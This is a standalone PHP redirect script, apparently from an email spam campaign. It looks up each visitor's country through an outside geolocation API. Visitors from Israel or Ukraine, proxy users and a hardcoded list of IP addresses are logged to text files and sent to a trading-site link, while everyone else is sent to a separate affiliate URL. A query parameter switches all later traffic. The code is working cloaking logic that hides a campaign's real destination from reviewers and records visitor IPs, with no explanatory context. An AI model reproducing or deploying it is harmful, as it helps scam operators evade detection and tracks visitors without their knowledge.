<?php
$ip=$_SERVER['REMOTE_ADDR'];

if(isset($_GET["a"])){
  $file = 'q.txt';
  $person = "ras";
  file_put_contents($file, $person, FILE_APPEND | LOCK_EX);
  header('Location: https://trade.algo-bit.com?p1=unimail6');
}else{
$section = file_get_contents('./q.txt', NULL, NULL, 0, 3);
if ($section == "ras"){
  header('Location: https://trade.algo-bit.com?p1=unimail7');
}else{

$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL =>
"http://api.sypexgeo.net/json/".$ip,
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => "",
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => "GET",
  CURLOPT_POSTFIELDS => "",
  CURLOPT_HTTPHEADER => array(
    "cache-control: no-cache",
    "content-type: application/x-www-form-urlencoded",
    "postman-token: a2fe16ce-d9e9-8a35-ebcd-0844691b3544"
  ),
));


$response = curl_exec($curl);
$err = curl_error($curl);

curl_close($curl);
$ras = json_decode($response);
if ($err) {
  echo "";
} elseif ($ras->country->iso == 'IL') {
	$file = 'ipisrael.txt';
	$person = $ip."\n";
	file_put_contents($file, $person, FILE_APPEND | LOCK_EX);
	header('Location: https://trade.algo-bit.com?p1=unimail1');
}elseif($ras->country->iso == 'UA') {
	$file = 'ipua.txt';
	$person = $ip."\n";
	file_put_contents($file, $person, FILE_APPEND | LOCK_EX);
	header('Location: https://trade.algo-bit.com?p1=unimail2');
}elseif (!empty($_SERVER['HTTP_VIA'])) {
  $file = 'ipproxy.txt';
  $person = $ip."\n";
  file_put_contents($file, $person, FILE_APPEND | LOCK_EX);
  header('Location: https://trade.algo-bit.com?p1=unimail3');
}elseif(($ip == '185.87.194.46')||($ip == '185.87.194.46')||($ip == '46.38.48.169')||($ip == '111.68.19.131')||($ip == '124.248.207.68')||($ip == '46.151.211.218')||($ip == '198.55.50.33')||($ip == '104.192.100.31')||($ip == '91.121.80.205')||($ip == '176.9.56.6')||($ip == '195.88.7.112')||($ip == '37.251.160.243')||($ip == '91.142.213.109')||($ip == '62.233.117.234')||($ip == '117.121.242.109')||($ip == '41.222.38.155')) {
  $file = 'ipproxysimilar.txt';
  $person = $ip."\n";
  file_put_contents($file, $person, FILE_APPEND | LOCK_EX);
  header('Location: https://trade.algo-bit.com?p1=unimail4');
}else{
  //header('Location: https://trade.algo-bit.com?p1=unimail5');
 	header('Location: http://converto-force.com/r/333/44/0/p');
};
}
}
?>
